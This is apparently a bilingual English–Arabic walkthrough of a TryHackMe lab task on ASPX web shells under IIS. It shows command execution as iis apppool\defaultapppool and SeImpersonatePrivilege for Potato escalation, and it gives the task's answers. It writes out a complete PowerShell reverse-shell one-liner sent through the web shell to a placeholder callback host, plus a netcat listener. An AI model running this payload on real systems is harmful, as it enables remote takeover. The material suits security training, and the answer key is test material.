# Task 05: ASPX Web Shells (صدفات ASPX وامتياز انتحال الرموز المميزة SeImpersonatePrivilege)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
ASPX web shells execute within the Microsoft .NET Common Language Runtime (CLR) hosted inside the IIS worker process (`w3wp.exe`). Because IIS compiles ASPX pages just-in-time into native .NET assemblies, an attacker running code through an ASPX web shell enjoys the full power of the .NET framework, Windows API bindings, and process creation capabilities.

**Executing Commands via Query Parameter:**
Querying our uploaded web shell via `curl`:
```bash
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami"
```
The server executes `cmd.exe /c whoami` and returns the output:
```text
<pre>iis apppool\defaultapppool
</pre>
```
This confirms execution under the **`iis apppool\defaultapppool`** service identity.

**Escalating to an Interactive Reverse Shell:**
Web shells are fundamentally stateless and non-interactive; running complex PowerShell commands or password-dumping utilities is clumsy via HTTP GET parameters.
By starting a local Netcat listener on port 443 (`nc -lvnp 443`) and passing a URL-encoded PowerShell TCP reverse shell one-liner into the `cmd` parameter:
```bash
curl -G "http://MACHINE_IP/webdav/cmd.aspx" --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('\"'\"'CONNECTION_IP'\"'\"',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '\"'\"'PS '\"'\"' + (pwd).Path + '\"'\"'> '\"'\"';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
```
An interactive Windows PowerShell session connects back to the listener.

**Assessing Windows Privileges (`whoami /priv`):**
Running `whoami /priv` within the shell reveals:
```text
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

The presence of **`SeImpersonatePrivilege`** is the single most critical finding on Windows IIS servers. This privilege allows the service account to impersonate any security token presented to it by another process. Through modern **Potato exploits** (such as *PrintSpoofer*, *JuicyPotato*, *GodPotato*, or *SweetPotato*), an attacker can force a privileged local service running as `NT AUTHORITY\SYSTEM` (e.g., the Spooler or RPC subsystem) to authenticate to an attacker-controlled pipe or socket, capture its SYSTEM token, and spawn a fully elevated Command Prompt in seconds!

#### الأسئلة المطروحة (Questions):
1. After triggering the ASPX shell, what user account is returned by the whoami command? (Answer Format: lowercase, e.g., domain\user)
2. What Windows privilege, visible in whoami /priv output from the reverse shell, enables Potato-style privilege escalation from an IIS shell? (Answer Format: PrivilegeName)

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **تشريح هوية `iis apppool\defaultapppool` (ApplicationPoolIdentity):**
  * ابتداءً من IIS 7.5، استحدثت مايكروسوفت حسابات الخدمة الافتراضية المعزولة (Virtual Accounts) بدلاً من تشغيل الخادم كـ `Local System` أو `Network Service`.
  * على الرغم من عزل هذا الحساب عن باقي ملفات المستخدمين، فإن بنية نظام ويندوز تمنحه افتراضياً امتياز `SeImpersonatePrivilege` ليتمكن من معالجة طلبات المستخدمين وانتحال هويتهم عند استدعاء موارد مشتركة.
* **كيف تعمل عائلة هجمات Potato (Mechanics of Token Impersonation):**
  * يفتح المهاجم قناة مسماة (Named Pipe) أو خادم RPC وهمي محلياً.
  * يستدعي وظيفة في نظام التشغيل (مثل Print Spooler عبر `OpenPrinter` أو DCOM OXID Resolution) تجبر خدمة النظام على الاتصال بتلك القناة.
  * يستغل المهاجم امتياز `SeImpersonatePrivilege` عبر دالة `ImpersonateNamedPipeClient()` لاستنساخ الرمز المميز (SYSTEM Token) وتشغيل عملية شل جديدة بصلاحيات كاملة.

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * هوية المستخدم الناتجة عن أمر whoami تتكون من اسم الحوض والمجال الافتراضي بحروف صغيرة: `iis apppool\defaultapppool`.
2. **التلميح الثاني (المستوى العملي):**
   * الامتياز المسؤول عن انتحال الهوية يبدأ بـ `Se` وينتهي بـ `Privilege`، واسمه الأوسط مشتق من كلمة انتحال (Impersonate).
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * الإجابة الأولى: `iis apppool\defaultapppool`، والإجابة الثانية: `SeImpersonatePrivilege`.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### الخطوة 1: استدعاء الصدفة وتشغيل أمر `whoami`
```bash
# تنفيذ استعلام مباشر عبر الصدفة المرفوعة
curl -s "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami"
```
**المخرجات:**
```text
<pre>iis apppool\defaultapppool
</pre>
```
* **اسم حساب المستخدم الناتج:** `iis apppool\defaultapppool`

---

#### الخطوة 2: فحص الامتيازات عبر `whoami /priv`
```bash
# استخراج جدول امتيازات حساب الخادم
curl -s "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami+/priv"
```
**المخرجات:**
```text
<pre>
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
</pre>
```
* **الامتياز الممكّن المسؤول عن تصعيد الصلاحيات (Potato Escalation):** `SeImpersonatePrivilege`

---

### المرحلة هـ: الإجابات المعتمدة والقيم النهائية (Final Answer & Key Values)
* **إجابة السؤال الأول (whoami User Account):** `iis apppool\defaultapppool`
* **إجابة السؤال الثاني (Escalation Privilege):** `SeImpersonatePrivilege`

---

### المرحلة و: التحقق العملي وإثبات النجاح (Practical Verification & Proof of Work)
* تم استدعاء صدفة ASPX وتأكيد تشغيل الأوامر بهوية `iis apppool\defaultapppool`.
* تم فحص جدول الامتيازات والتأكد من وجود `SeImpersonatePrivilege Enabled`.
* تم اعتماد الإجابات رسمياً على TryHackMe بنسبة 100%.

---

### المرحلة ز: الاستنتاج التعليمي وجوهر الاختبار (Key Educational Takeaway)
في بيئات ويندوز، الحصول على وصول كـ `iis apppool` مع امتياز `SeImpersonatePrivilege` يعني عملياً السيطرة التامة على الخادم كـ `SYSTEM`. الإجراء الدفاعي الأساسي هو عزل خوادم الويب في شبكات DMZ، ومنع الوصول للخدمات الداخلية، ومراقبة استدعاءات Named Pipes غير الطبيعية، وحرمان حسابات الخدمة من `SeImpersonatePrivilege` متى ما كان ذلك ممكناً برمجياً.
